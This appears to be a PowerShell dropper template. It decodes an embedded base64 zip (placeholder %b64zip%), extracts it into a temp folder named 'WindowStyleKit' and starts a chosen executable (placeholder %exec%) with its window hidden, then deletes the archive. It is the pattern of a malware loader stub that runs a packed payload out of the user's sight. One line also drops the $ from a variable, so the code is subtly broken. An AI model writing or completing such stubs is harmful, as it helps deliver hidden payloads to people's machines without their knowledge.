$exec = %exec%
$base64String = %b64zip%

$temp = New-TemporaryFile
$temp_path = $temp.DirectoryName

$bytes = [System.Convert]::FromBase64String($base64String)

Set-Content -Path $temp.FullName -Value $bytes -Encoding Byte

Expand-Archive -Path $temp.FullName -DestinationPath (Join-Path $temp_path "WindowStyleKit")
Remove-Item $temp.FullName

Set-Location temp_path\WindowStyleKit
Start-Process $exec -WindowStyle Hidden